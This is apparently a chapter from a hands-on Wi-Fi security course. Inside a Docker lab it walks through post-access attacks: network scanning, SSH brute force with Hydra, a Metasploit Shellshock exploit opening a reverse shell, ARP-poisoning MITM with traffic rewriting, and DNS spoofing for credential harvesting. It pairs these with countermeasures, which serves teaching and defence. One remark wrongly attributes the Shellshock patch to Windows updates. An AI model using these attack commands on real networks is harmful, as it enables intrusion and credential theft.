# Attacks After Gaining Network Access

After breaking the WEP protocol (or any of the ones that will be studied next) and gaining access to the internal network, an attacker could carry out multiple malicious actions. This section shows some examples of attacks that may arise once inside the network. This is meant to raise awareness about the importance of security and how an attacker can damage an organization simply by having access to its internal network.

`Note:` It is recommended to test these attacks after completing each of the attacks that grant access to the WLAN network, using the files from the corresponding attack branch that provide access to the Wi-Fi network.

### Network scanning

Once access to the network has been achieved, the first thing that can be tried is a scan to identify nearby devices with which the attacker machine now coexists. For this, the well-known command `nmap` is used, first to locate all active machines on the network. But before that, the network on which the machine is located must be known; to do so, the attacker machine is connected and an IP is requested via DHCP:
```bash
docker-compose exec attacker-1 bash 
wpa_supplicant -i wlan4 -c wpa_supplicant.conf -B
dhclient wlan4
ifconfig          # View the established connection
```
![image](https://github.com/user-attachments/assets/95d52a52-00b6-4976-b54f-37ddb59cc163)

As can be seen, the attacker machine is in `10.5.2.128/26`, which at first glance seems like a rather small network. Assuming the network is actually larger, it is better to scan the `10.5.2.0/24` network instead (it should not be much larger due to the excessive overhead involved):
```bash
nmap -sn 10.5.2.0/24
```
* `-sn`: ping scan (detect active machines)

![image](https://github.com/user-attachments/assets/3ba0e58d-f10f-44a3-bce7-c58a510e944b)

In addition, the `10.5.1.0/24` network can also be scanned, since it contains public-facing servers whose IP address is known and accessible from outside; therefore, it is interesting to see which machines are running on that network and whether there are any others that are not visible from outside:
```bash
nmap -sn 10.5.1.0/24
```
![image](https://github.com/user-attachments/assets/40cfd951-4b0e-4dd7-8e69-29b23fdb58f8)

Finally, both networks are scanned in greater depth, looking for the services exposed by each active machine:
```bash
nmap -p- -sV 10.5.2.0/24 10.5.1.0/24
```
- `-p-`: scans all ports.  
- `-sV`: detects service versions on open ports.

![image](https://github.com/user-attachments/assets/7e0ee857-2b1e-4b0a-a3f8-bf1386b404a7)
![image](https://github.com/user-attachments/assets/d52c95a2-c686-4af1-86c7-e7271e9c965a)
![image](https://github.com/user-attachments/assets/9c915b4b-a6e6-42c9-a7d0-314815b3b2ee)
![image](https://github.com/user-attachments/assets/fd1afc99-c82d-48d6-a3e0-086a79efbe01)

Several interesting aspects are detected here, which will be explored in the following attacks or tests.

### Exploiting privileges on the internal network

First, the possible access paths to the servers exposed by the organization can be seen; by gaining SSH access, it would be possible, for example, to insert some kind of malware into the website or redirect users to a network controlled by the attacker that steals credentials. To attempt these changes, an SSH connection could be tried with typical usernames and passwords such as `root:root`:
```bash
ssh root@10.5.1.20
ssh root@10.5.1.21 -p 2222 # This suspicious port can be seen
```
![image](https://github.com/user-attachments/assets/76e3261c-58ef-4dab-9212-20f7f6c4cdd8)

In one of the cases, that password fails (the credentials for DMZ2 are actually `carlos:passw0rd1234` and not `root:root`, but the attacker does not know that). However, when accessing DMZ1, that connection is allowed exclusively because the attacker is inside the internal network (this can be verified from the `external` machine, where this connection is not permitted). 

![image](https://github.com/user-attachments/assets/7fe041ec-0a62-421b-90cb-290deb63d803)

This is because the firewall rule that limits administrative access to the servers simply checks whether the users attempting such access are within the internal network:
```bash
iptables -A FORWARD -s 10.5.0.0/24 -d 10.5.1.20 -p tcp --dport 22 -j ACCEPT          # Redirect to Cowrie external SSH to DMZ1
iptables -A FORWARD -s 10.5.2.0/24 -d 10.5.1.20 -p tcp --dport 22 -j ACCEPT          # Allow all internal network to admin dmz servers
iptables -A FORWARD -s 10.5.2.0/24 -d 10.5.1.21 -p tcp --dport 2222 -j ACCEPT
```

To see the effects this could have, `/usr/local/apache2/htdocs/` can be accessed, where the `index.html` file that shows the homepage is located, and the main text can be changed to a different message. Once the changes are saved, this alteration can be checked from the `external` machine, which represents any Internet user:
```bash
# Attack
docker-compose exec attacker-1 bash
ssh root@10.5.1.20
# Verification from a legitimate machine
docker-compose exec external bash
curl 10.5.2.20
```
![image](https://github.com/user-attachments/assets/fd3cebff-e89b-401b-8933-17d3cbbd6e0a)

![image](https://github.com/user-attachments/assets/2d51b67c-c820-416c-8667-398bce04f81c)

Here it can be seen that the original message —“Hi! I am the server known as DMZ1”— is no longer displayed, but instead one altered by the attacker: “Hi!, I am the attacker who has taken over this server”. This represents a significant danger, since this access could be used to modify any web resource, even introducing malware downloadable by users or redirections to sites controlled by the attacker.

#### Countermeasures and recommendations

Some options that can stop this attack begin with limiting which machines may establish that SSH communication through `iptables` rules on the firewall (`fw`):
```bash
docker-compose exec fw bash
# Deletion of old rules
iptables -L FORWARD --line-numbers # Find the number of the old rule (FORWARD chain only)
iptables -D FORWARD 10 # Delete old rule by number (first the one with the highest index)
iptables -D FORWARD 9  # Delete old rule by line number
# Establishment of new rules
iptables -A FORWARD -s 10.5.2.22 -d 10.5.1.20 -p tcp --dport 22 -j ACCEPT            
iptables -A FORWARD -s 10.5.2.22 -d 10.5.1.21 -p tcp --dport 2222 -j ACCEPT 
iptables -A FORWARD -s 10.5.2.23 -d 10.5.1.20 -p tcp --dport 22 -j ACCEPT            
iptables -A FORWARD -s 10.5.2.23 -d 10.5.1.21 -p tcp --dport 2222 -j ACCEPT 
```
![image](https://github.com/user-attachments/assets/cf48542c-e60c-4954-911a-ac9cf218b8ca)

With this, administrative access to the DMZ servers is limited to machines `10.5.2.23` (internal-4) and `10.5.2.22` (internal-3). This is because having a wired machine with a fixed IP, such as int4, is more common and more controlled. In addition, a second wired machine with these permissions is added because it receives and masks secure communication through VPN.

Verification examples:
```bash
# Test connection from int4
docker-compose exec internal-4 bash (works)
ssh root@10.5.1.20
ssh root@10.5.1.21 -p 2222

# Test connection from int1 (fails)
docker-compose exec internal-1 bash
ssh root@10.5.1.20
ssh root@10.5.1.21 -p 2222

# Test connection from VPN (with the external machine, works)
docker-compose exec external bash
openvpn --config /etc/openvpn/client.conf  # VPN connection
ssh root@10.5.1.20
ssh root@10.5.1.21 -p 2222

# Test connection from the attacker (fails)
docker-compose exec attacker-1 bash
ssh root@10.5.1.20
ssh root@10.5.1.21 -p 2222
```

With this, the attacker from the wireless network cannot connect even if the credentials are known, because even if the IP is changed, it will be masked by the access point before reaching the internal network. In addition, access is granted to any machine that knows the VPN credentials (trusting that they are distributed securely within the organization), which establishes a secure communication with the `int3` machine that is then masked with that machine’s source IP, thus allowing SSH communication with the DMZ servers. This can even be done from other devices on the internal network that would not initially have that access (although in this lab it is only tested from `ext1`, the only one that has the VPN client configuration).

Another countermeasure already in place by default is the redirection of SSH connections from port 22 (the default) coming from the external network to a trap ([`Honeypot`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/config#honeypot)) that the DMZ1 machine contains on port 2222, simulating a fake server. These effects can be seen when a connection is attempted from the external machine without using the VPN and therefore without legitimate access to DMZ resource administration.

### Breaking SSH (brute force)

If the measures adopted to mitigate the previous attack are not taken into account, SSH credentials can be targeted, which could even give access to DMZ1 that was not obtained before (it has more robust credentials). First, the attacker machine must connect to the Wi-Fi access point:
```bash
docker-compose exec attacker-1 bash 
wpa_supplicant -i wlan4 -c wpa_supplicant.conf -B
dhclient wlan4
```

Once inside the network and knowing its details thanks to the [scan](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/Attacks#network-scanning), the password of any of the DMZ servers can be broken. This is done with the tool [`Hydra`](https://www.kali.org/tools/hydra/) from Kali Linux, which allows dictionary attacks (trying many options listed in `.txt` files, for example). For this, dictionaries are needed, which in this case were taken from public projects and reduced for the lab; in real environments, however, more complete lists adapted to the specific attack should be used (searching the Internet, for example):

- [`ssh_passwords.txt`](https://github.com/jeanphorn/wordlist/blob/master/ssh_passwd.txt): typical SSH passwords.
- [`ssh_usernames.txt`](https://github.com/jeanphorn/wordlist/blob/master/usernames.txt): typical SSH usernames.

With these dictionaries (already inside the attacker machine), the brute-force attack against the DMZ1 server can be launched (starting with this one, though it will be shown to work against both), since its credentials are known to be weak:
```bash
hydra -L ssh_usernames.txt -P ssh_passwords.txt -t 4 -s 22 ssh://10.5.1.20
```
* `-L ssh_usernames.txt`: specify usernames to try
* `-P ssh_passwords.txt`: specify passwords to try for each username
* `-t 4`: run 4 processes in parallel (optional, but gets the password faster)
* `-s 22`: specify port (optional if it is the default)
* `ssh://10.5.1.20`: URL indicating the victim machine’s IP
![image](https://github.com/user-attachments/assets/d6b5629b-f274-4d6c-a6aa-1055f6de4a40)

As expected, the credentials "root:root" are captured easily on this server. Doing the same for the DMZ2 server (remembering that it is exposed on port 2222) also produces a successful result, capturing the credentials "carlos:passw0rd1234", which are not very robust and can therefore be obtained:
```bash
hydra -L ssh_usernames.txt -P ssh_passwords.txt -t 4 -s 2222 ssh://10.5.1.21
```
![image](https://github.com/user-attachments/assets/121bc6c8-314a-457d-8592-f4ca4a03aea0)

#### Countermeasures and Recommendations
These adverse aspects can be mitigated in several ways. First, with what was seen previously: limiting the users who can establish SSH connections through the firewall. This is a very good option, because it protects the servers even with a weak password, which would ideally be combined with the other option: setting more robust credentials. In this second case, some strong credentials can be created and the attack can be executed again to verify that brute force is no longer enough. For this test, the [`Dockerfile`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/blob/Attacks/dmz/dmz2/Dockerfile) of DMZ2 can be modified to change the user `carlos:passw0rd1234` to a stronger one, for example, `carlos:d9Z!m@4rQ#LfT$2xNp`. After that, the lab is stopped and started again with the changes applied:

![image](https://github.com/user-attachments/assets/981ab074-dd1a-4cb3-9ca6-bfcfe8a6c500)
```bash
sudo ./stop.sh
sudo ./launch.sh
```
And by executing the attack again, it can be verified that obtaining the credentials is no longer possible:
```bash
hydra -L ssh_usernames.txt -P ssh_passwords.txt -t 4 -s 2222 ssh://10.5.1.21
```
![image](https://github.com/user-attachments/assets/eec24245-2a26-4c14-bae2-55cb3a9a4d13)

As has been seen, using robust credentials is always a very good option, with exclusive public/private key authentication being even more advisable. This type of connection can be tested from the `int1` and `int2` machines (before reducing the machines with SSH access to the DMZ servers) using:
```bash
ssh -i .ssh/id_rsa -o IdentitiesOnly=yes -p 2222 carlos@10.5.1.21 # Key passphrase "1234" for id_rsa
```
![image](https://github.com/user-attachments/assets/3a379677-81a8-4634-a8f6-22ebe17a0d26)

Where `.ssh` is the directory storing the required keys.

In addition, another countermeasure has already been seen: the trap laid by the DMZ1 server when an external user tries to connect. DMZ2 includes other recommended, more robust authentication options. First, the service [`fail2ban`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/config#dmz2), which bans the IPs of those users who make too many connection attempts. To test its effects, [`start.sh`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/blob/Attacks/dmz/dmz2/start.sh) must be modified to uncomment the line that starts it:

![image](https://github.com/user-attachments/assets/63597629-9473-460d-b449-24997cb1ce4c)

After this (and after restarting the lab), it is recommended to run the attack again to verify that the attacker’s IP is now banned and cannot continue the attack. It is also recommended to do this with a weak password to confirm that the attack has been stopped thanks to the ban:

```bash
hydra -L ssh_usernames.txt -P ssh_passwords.txt -t 4 -s 2222 ssh://10.5.1.21
```
![image](https://github.com/user-attachments/assets/318933eb-4444-4d94-9904-b4bcf8aca413)

Another possibility to stop this kind of attack is two-factor authentication, which requires an extra application such as "Google Authenticator" (the one used here) to generate a temporary code that must be entered in addition to the password. To activate it, it is enough to uncomment the lines in the [`Dockerfile`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/blob/Attacks/dmz/dmz2/Dockerfile) of DMZ2 that enable it:

![image](https://github.com/user-attachments/assets/9d5617e5-1bcb-4862-bb41-30f94dee051a)

After this, it is recommended to restart the lab and the attack, so that now the attack no longer works because it requires those temporary codes, which are inaccessible to the attack tool:

```bash
hydra -L ssh_usernames.txt -P ssh_passwords.txt -t 4 -s 2222 ssh://10.5.1.21
```
![image](https://github.com/user-attachments/assets/145c4ce3-1364-404e-8900-aa7e820d292c)

`Note:` To use two-factor authentication, Google Authenticator must be installed and the code `ZQNGC4KR6UF3AGKUP6H6XCUICY` associated with the DMZ2 server must be entered, so that the temporary codes can then be obtained.

As can be seen, there are many ways to strengthen SSH security, but combining several of these measures is strongly recommended, since they are not excessively intrusive in terms of usability and provide a high level of protection, especially when combined.

### Attack with Metasploit
Once SSH access to the DMZ servers is restricted, one attack option is to first take over an administration machine. Assuming that this is not achieved through weak SSH (although in fact any of the authorized machines has it), let us move on to trying other kinds of attacks. Although it does not really show up clearly in the [network scan](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/Attacks#network-scanning), the "GNU Bash Remote Code Execution" vulnerability, popularly known as [`ShellShock`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/blob/config/README.md#shellshock), is reflected in the open port 80 on machine `10.5.2.23` (visible in the [network scan](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/Attacks#network-scanning)). The goal here is to attack vulnerability [`CVE-2014-6271`](https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2014-6271).

A common way to proceed when facing a vulnerable machine discovered with `nmap` is to search the Internet for exploits for the vulnerable services it exposes (this can be seen thanks to the service and version discovered with options such as `-sV`). In this course, the well-known exploit database [`Metasploit`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/config#metasploitable3) is used, which is very convenient thanks to its working console, `msfconsole`:
```bash
docker-compose exec attacker-1 bash 
wpa_supplicant -i wlan4 -c wpa_supplicant.conf -B
dhclient wlan4
# Start the Metasploit console
msfconsole
```
Once started, the suitable exploit for our task can be searched for using `search`:
```bash
# Search by CVE
search cve:2014-6271
# Search by name (it can also be a port or another matching parameter)
search shellshock
```
![image](https://github.com/user-attachments/assets/b2ea8a06-b5e8-446d-8b4f-336d971ff388)
![image](https://github.com/user-attachments/assets/b3988a24-26e2-4198-a7c7-d88253bf8a29)

Several exploit options or several versions of each exploit can be seen here; the most suitable one must be selected for the particular case. If the information is not enough, more detail about each module can be obtained with:
```bash
info <exploit-line>
```
![image](https://github.com/user-attachments/assets/854ea0a4-6408-48c3-b4e4-5c9cbcffa668)
![image](https://github.com/user-attachments/assets/be526b56-346e-41d8-b3e1-a7aa93e81fb6)

This shows in detail everything required by the exploit to work (in this case, the second exploit is being chosen because it better matches the Apache server on int4), as well as an extensive description of the exploit. In this particular case, it is preferable to select the option that does not specify the victim machine’s operating system, since it is unknown. To begin the attack:
```bash
use exploit/multi/http/apache_mod_cgi_bash_env_exec
```
Together with:
```bash
show options
```
![image](https://github.com/user-attachments/assets/ec8006e6-ed5a-4460-b7ae-834004c20d03)
![image](https://github.com/user-attachments/assets/3a444f41-f1ec-432f-923d-b2a3848a38bf)

Which allows the configurable options that were previously displayed with `info` to be viewed. Here the following command must be used:
```bash
set <option-name> <value>
```
To modify whichever options are appropriate depending on the attack to be launched. In the case of this attack, it can be configured as follows (the URI "/cgi-bin/vulnerable" is specified in the Docker Hub page of the [`vulnerable`](/cgi-bin/vulnerable) image):
![image](https://github.com/user-attachments/assets/6d942896-9d0e-4b0e-9bd2-ab0c73383a74)
![image](https://github.com/user-attachments/assets/19bf0d02-b051-4cc8-b13a-ecf427012dc1)

On the other hand, the payload type can also be selected, that is, the action to be performed once the attacked service is successfully compromised. For the goal of gaining remote access, a reverse shell is enough (already selected, although if a different one is chosen it is advisable to check the selection again afterwards). Basically, what this payload does is make the victim connect back to one of our processes, which then serves to send commands to the victim as if it were an SSH communication with it.
```bash
# View available payloads
show payloads
# Change payload
set payload 8 # A reverse shell for metasploitable
```
![image](https://github.com/user-attachments/assets/9b1388cc-444c-4362-8188-04f0acba07f1)
![image](https://github.com/user-attachments/assets/4683c763-fa84-42e6-b714-d0ba1387e092)
![image](https://github.com/user-attachments/assets/786726b4-078f-4641-a14f-22b2fd2051a3)

Finally, the attack is launched with:
```bash
exploit
```
![image](https://github.com/user-attachments/assets/4652d9eb-7977-4dc8-9ad9-71971acce36b)
![image](https://github.com/user-attachments/assets/93e20644-5173-484e-8ad8-2af95e3954cc)

With this, it can be seen that control has been gained over a machine that has SSH access privileges to the DMZ servers (ideally, the credentials should be obtained in order to reconnect legitimately via SSH) even after the hardening of the iptables rules regarding that matter. Therefore, the [countermeasures related to the first attack](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/Attacks#countermeasures-and-recommendations) would have been bypassed, giving access again to the DMZ machines (unless the countermeasures from the second attack are implemented), together with all the problems previously discussed that this entails.

`Note:` The `client-3` machine contains several vulnerable services because it is a [`Metasploitable3`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/config#metasploitable3) machine, so it is strongly recommended to try more attacks like the one explained here, both with `msfconsole` and by searching the Internet for the exposed services and their vulnerabilities.

#### Countermeasures and Recommendations
Thus, the countermeasures from the first attack would not be very useful if a machine that still has access is under the attacker’s control, although it also makes little sense to restrict those accesses even further. One option that can at least make things harder for attackers is the [countermeasures related to the second attack](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/Attacks#countermeasures-and-recommendations-1), which make it harder to discover the credentials. However, it is very likely that the victim machine (in this case int3) contains the private key of a public-key-based authentication system, which would also give the attacker access to that key, allowing an attempt to break its passphrase and gain access. 

Therefore, the most advisable option is to prevent the machines connected to the internal network from being attacked in the first place. This attack was mitigated by Microsoft with a patch, which could be applied by updating Windows. This highlights the importance of updates for security, patching flaws that make machines vulnerable. Thus, the best solution to prevent these vulnerabilities is to keep the machines in use continuously updated, and also to avoid exposing services that are not really needed. It is also advisable for companies and organizations, especially those handling personal data, to carry out security audits from time to time in order to find these vulnerabilities and fix them before a cybercriminal does.

### MITM with Cleartext Messages
Now the focus shifts completely: the goal is no longer to alter the website offered by the victim organization, but rather to steal cleartext information. To do this, both a machine on the internal network (whether wired or wireless) and the attacker machine are connected in another terminal:
```bash
# Client terminal (any WLAN client can be used)
docker-compose exec client-1 bash 
# Attacker terminal
docker-compose exec attacker-1 bash
wpa_supplicant -i wlan4 -c wpa_supplicant.conf -B
dhclient wlan4
```
In this way, the client machine will generate the traffic to be stolen, while the attacker machine will extract this information. First, the attack is prepared with `nmap` as before, where it was seen that one server’s IP is `10.5.2.20` (the same can be done with the other), and the victim machine’s IP (the one we connected to) is `10.5.1.130` (any other machine on the internal wireless network could also be used). However, this type of attack is only possible in the local network area, where the ARP protocol is actually used (link layer). Therefore, the victim server’s IP is not attacked directly; instead, the traffic between the victim (`10.5.1.130`) and the access point (`10.5.2.129`) is intercepted, making it possible to interfere with any communication from the victim client.

Now the `ettercap` tool is started to begin an ARP Poisoning attack, which consists of poisoning ARP caches in order to redirect traffic between the access point and the victim so that it passes through the attacker:

![image](https://github.com/user-attachments/assets/76f4c508-e999-4004-abb7-d354796dedc1)  
![image](https://github.com/user-attachments/assets/52327631-db0e-4709-a172-b71e68c608fc)

```bash
# Traffic will pass through the attacker, so forwarding must be enabled
echo 1 > /proc/sys/net/ipv4/ip_forward
# Use ettercap
ettercap -T -M arp:remote /10.5.2.129// /10.5.2.130//
```
- `-T`: use text mode (no GUI).  
- `-M arp:remote`: MITM through remote ARP cache poisoning (victim and access point).  
- `/10.5.2.129//`: target 1, access point.  
- `/10.5.2.130//`: target 2, WLAN client.

`Note:` On systems with GUI, the tool is more intuitive.

**HTTP:**  
Attacker (captures cleartext HTTP traffic):
![image](https://github.com/user-attachments/assets/88621de6-c23c-4c3a-aea2-fc2c7c331940)  
![image](https://github.com/user-attachments/assets/1f586f13-f488-4180-979d-a7a6bde1166b)  
![image](https://github.com/user-attachments/assets/a7e4fb68-45e1-4619-aa31-6310164fa784)  
![image](https://github.com/user-attachments/assets/29923c40-8695-481f-baa7-40ca714556ee)  
![image](https://github.com/user-attachments/assets/fff0de5a-6baf-48ce-bfd5-47dacaa325c0)

Client (sees the page normally):
![image](https://github.com/user-attachments/assets/483af281-f855-4d54-9808-3d91069eb70f)

**Telnet (example):**

```bash
# Temporarily allow connection to port 2222
# on dmz1 in order to test Telnet communications
docker-compose exec fw bash
iptables -A FORWARD -s 10.5.2.0/24 -d 10.5.1.20 -p tcp --dport 2223 -j ACCEPT
```
**Attacker (captures cleartext Telnet):**
![image](https://github.com/user-attachments/assets/e477e3ec-6872-4156-a3e4-50d09bf27644)  
![image](https://github.com/user-attachments/assets/21b9d32e-93d9-47fe-9f00-598d200cf347)  
![image](https://github.com/user-attachments/assets/1b13fafc-7a74-4e9a-a5b5-f2717f33cb19)  
![image](https://github.com/user-attachments/assets/fe75006e-ae95-43ab-a722-8ea9655c85c5)

**Client:**
![image](https://github.com/user-attachments/assets/3ed115bb-9a6c-490d-80bd-e77a2e67b707)

With this, it is demonstrated how this attack allows any cleartext information of the attacked client to be seen (whether going to the Internet or moving within the WLAN, the information passes through the access point). In addition, this type of attack also allows the information passing through the attacker to be modified; for this, Ettercap filters are used, which are configuration files that make it possible to select the information to be displayed or modified and how to do so:
```bash
nano http_replace.ef
```
```text
if (ip.proto == TCP && search(DATA.data, "DMZ")) {   # Search for DMZ inside HTTP packets (actually any TCP packet containing "DMZ")
    log(DATA.data, "/tmp/http_dmz_replace.log");                      # Log the changes
    replace("DMZ", "HCK");                                            # Replace content
    msg("HTTP modified: DMZ → HCK\n");                                # Message shown in the console at the time of the change
}
```
This filter can be saved as `http_replace.ef` and then validated with Ettercap’s `etterfilter` tool:
```bash
# Validation and compilation of the filter
etterfilter http_replace.ef -o http_replace.efilter
```
![image](https://github.com/user-attachments/assets/76182992-9cb1-4a25-b98b-68bcedc5dba9)

With everything configured, Ettercap is run again in order to perform a MITM through ARP poisoning, adding this filter to modify the information as intended:
```bash
ettercap -T -q -F http_replace.efilter -T -M arp:remote /10.5.2.129// /10.5.2.130//
```
- `-q`: quiet mode (only shows essential messages).  
- `-F http_replace.efilter`: add the created filter for message modification.

**Attacker (visible modifications):**
![image](https://github.com/user-attachments/assets/7788c4cd-fb08-4a34-88f3-2f3c0e9d72b9)  
![image](https://github.com/user-attachments/assets/0ae02b1f-c446-4448-b35d-d921639ce67c)

**Client (sees the modified content without knowing it):**
![image](https://github.com/user-attachments/assets/02832982-9ad9-44a4-a986-d76b1a079a70)

Finally, it can be seen how the attack is successful, allowing messages to be modified transparently for both the client and the access point. This is truly dangerous, as it is not only useful for stealing passwords, but could also alter crucial messages shared by employees on a network they believe to be secure. Furthermore, if this is combined with the [Metasploit attack](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/Attacks#attack-with-metasploit), in which control over a machine with greater privileges or in another network segment is gained, the attack potential extends beyond the wireless network.

#### Countermeasures and Recommendations
The main countermeasure to mitigate the effects of a MITM attack is to use protocols that encrypt the transmitted traffic: HTTPS instead of HTTP, SSH instead of Telnet, etc. If the communication is correctly encrypted, the attacker will not be able to read or modify the data (unless they manage to break or impersonate the encryption mechanisms, which is difficult for these application-layer protocols).

Verification example:
```bash
# Launch the attack
docker-compose attacker-1 fw bash
ettercap -T -M arp:remote /10.5.2.129// /10.5.2.130//

# Encrypted messages on the client
docker-compose exec client-1 bash
curl -k https://10.5.1.21        # Skip certificate verification (we do not have the CA)
ssh root@10.5.1.20               # Credentials root:root
```
**Attacker:**
![image](https://github.com/user-attachments/assets/9bb11df7-4546-4877-b1e8-667df71247ec)
![image](https://github.com/user-attachments/assets/df8d1fb8-1ff4-4e83-b906-e902c40834b1)
![image](https://github.com/user-attachments/assets/d12d8ca6-1b3c-4193-b5c9-888c21dede07)
![image](https://github.com/user-attachments/assets/462c1e28-dbac-42e9-b118-11eb4427904e)
![image](https://github.com/user-attachments/assets/a01d17d1-678c-4b2a-8f34-cbfca22f3bc5)
![image](https://github.com/user-attachments/assets/faab7936-f58d-405b-93a8-a3a646476561)

**Client:**
![image](https://github.com/user-attachments/assets/8cda1517-71f8-4a04-b6c0-46a07e620e71)

And consequently, the content cannot be altered either:
```bash
ettercap -T -q -F http_replace.efilter -T -M arp:remote /10.5.2.129// /10.5.2.130//
```
**Attacker (it does not show that the modification was completed; it does not detect the information due to encryption):**
![image](https://github.com/user-attachments/assets/01ca1f49-aade-468e-9b30-b59332cd639d)
![image](https://github.com/user-attachments/assets/0213ce76-2ea2-40de-ad0a-2b6ebc19a059)

**Client:**
![image](https://github.com/user-attachments/assets/8bbb4db5-951e-40d8-afb3-29a9c7678e33)

This proves a simple way to mitigate MITM-type problems: use protocols that encrypt the information. However, it must also be ensured that the versions of the encryption protocols used by higher-level protocols such as SSH or HTTPS are as recent as possible, or at least considered secure. This is because many of these protocols are broken in their older versions, again highlighting the importance of keeping technology updated.


### DNS Spoofing for Credential Theft
Finally, an attack is performed that follows the same line and aims at credential theft, even if encrypted services such as HTTPS are used. This attack consists of using `ettercap` again in combination with S.E.T. ([Social Engineering Toolkit](https://nexoscientificos.vidanueva.edu.ec/index.php/ojs/article/view/40/163)), a Kali Linux tool that helps carry out social engineering attacks, including cloning legitimate web pages that contain authentication processes. Thus, the idea is to clone the login page and, through DNS spoofing, redirect the user to the clone to capture the credentials.

What will actually happen is that the client will not find the used domain (`carlos.web.com`) in its local DNS cache and will make an external DNS request; the attacker, through a MITM, will be able to capture that request and reply with the IP of one of their own servers:

![image](https://github.com/user-attachments/assets/eac6c4eb-22d8-4d18-bdc7-d713f9d3a6e2)

More specifically, the goal is to clone the website published by the external server with IP `10.5.0.20`:

![image](https://github.com/user-attachments/assets/ceea2422-2bf6-47a1-9452-aae48eff4a80)

This can be done with S.E.T.’s `setoolkit`, which displays an interactive console to choose the social engineering technique:
```bash
docker-compose exec attacker-1 bash
wpa_supplicant -i wlan4 -c wpa_supplicant.conf -B
dhclient wlan4
setoolkit
```
![image](https://github.com/user-attachments/assets/5c354b6b-8ffd-4813-be27-9e2123c293b0)
![image](https://github.com/user-attachments/assets/f5fd1514-47a5-4d6b-8657-04365c60c35c)

At first, a warning about legal and ethical matters may appear; after accepting it, the application can be used properly (the red error message usually appears because there is no Internet connection to download updates):

![image](https://github.com/user-attachments/assets/2b443f3f-d8b1-4fe2-b6b2-61be29f8e23f)

The banner is shown here, together with a series of options, the ideal one in this case being `1) Social-Engineering Attacks`, since it contains, among other social engineering tools, those related to websites (if a newer version is obtained, this option may appear elsewhere):
![image](https://github.com/user-attachments/assets/ec3f279c-134e-4fa3-a575-ca18b7d6ef72)

Now option `2) Website Attack Vectors` must be selected:
![image](https://github.com/user-attachments/assets/0dc93d5f-6d7b-492c-91e7-c06e967fb476)

As shown, option `3) Credential Harvester Attack Method` consists of cloning a login process that sends an HTTP POST with the parameters `username` and `password`, which will be captured by the server launched by that option. This is ideal for our task, since it both clones the victim website and starts a server that records the credentials entered by the legitimate user whom we will redirect to this service.
![image](https://github.com/user-attachments/assets/c678f928-f14f-4a88-8681-cb32dcd23657)

Now option `2) Site Cloner` is selected, which fully clones the website and serves this clone from the attacker machine, as mentioned earlier:
![image](https://github.com/user-attachments/assets/6812383e-c772-46d7-b22e-eb7c347ad0ba)

At this step, the IP of the device that will be used to host the cloned site is requested, that is, the attacker’s IP (`10.5.2.133`), as well as the URL of the victim machine, `http://10.5.0.20`, although even if HTTPS is cloned, it is preferable not to enter it here because it will be exposed on port 80. At this point, the server is already running and listening on port `80` for requests to the cloned network:

**Attacker:**
![464326272-6418506e-4f6b-491c-adc1-54f136673e70](https://github.com/user-attachments/assets/ac77450b-af86-44d1-92b2-0b117c31d7f3)

**Client:**
![image](https://github.com/user-attachments/assets/890473da-b31c-4b98-b230-c181d4819723)

As seen, this can be verified from a legitimate WLAN user, which is then logged on the attacker side. In addition, it can be seen how, by simulating the response that would occur when pressing the `Login` button using:
```bash
curl -X POST -d "username=carlos&password=passw0rd1234" http://10.5.2.133:80/login 
```
A POST request with credentials is sent in the format expected by the web application, which is captured by the attacker. Now it is time to test this in a real attack situation, where the attacker must modify the DNS request through a MITM based on ARP (like the [`previous`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/Attacks#mitm-with-cleartext-messages) attack). First, a client is selected to act as the victim, for example, `client-1` with IP `10.5.2.130` (and gateway `10.5.2.129`), which typically accesses the external server `10.5.0.20` using the domain `carlos.web.com`. After that, the Ettercap files needed to launch an identity spoofing of the legitimate server behind that domain can be configured, starting with `/etc/ettercap/etter.conf`:
```bash
docker-compose exec attacker-1 bash  # New terminal
nano /etc/ettercap/etter.conf
```
Looking for the `ec_gid` and `ec_uid` options, which must be set to `0` to allow Ettercap to act as root and thus make all the required changes to interfaces and other tools it may need:
![image](https://github.com/user-attachments/assets/9c177c07-da2e-4f2b-b722-8542391cb7e3)

On the other hand, `/etc/ettercap/etter.dns` must be configured to include `carlos.web.com  A  10.5.2.133`, a line indicating the domain (`carlos.web.com`) whose IP is to be changed on the victim, as well as the new IP that domain will take, that is, the attacker’s IP (`10.5.2.133`):
```bash
nano /etc/ettercap/etter.dns

# If there are no previous configurations, it can be done with
echo "carlos.web.com  A  10.5.2.133" >> /etc/ettercap/etter.dns
```
![image](https://github.com/user-attachments/assets/81c84d31-b5ed-47d6-9b35-0b973b0d836b)

With all this configured, an Ettercap command very similar to the one used in the [`previous`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/Attacks#mitm-with-cleartext-messages) attack can be executed, except that now a plugin is added to capture and modify DNS requests and responses; this takes advantage of the previous configuration for this task:
```bash
# Traffic will pass through the attacker, so forwarding must be enabled
echo 1 > /proc/sys/net/ipv4/ip_forward
# Use ettercap with the DNS Spoofing plugin
ettercap -T -q -P dns_spoof -M arp:remote /10.5.2.129// /10.5.2.130//
```
- `-T`: use text mode (no GUI).
- `-q`: quiet mode (only shows essential messages).
- `-P dns_spoof`: plugin that enables DNS Spoofing.
- `-M arp:remote`: MITM through remote ARP cache poisoning (victim and access point).
- `/10.5.2.129//`: target 1, access point.
- `/10.5.2.130//`: target 2, WLAN client.

**Attacker:**
![image](https://github.com/user-attachments/assets/fbf54040-4128-458a-bf3c-fff7494642b6)
![image](https://github.com/user-attachments/assets/fea37eb8-c579-4691-9815-a64f0c1ccd24)

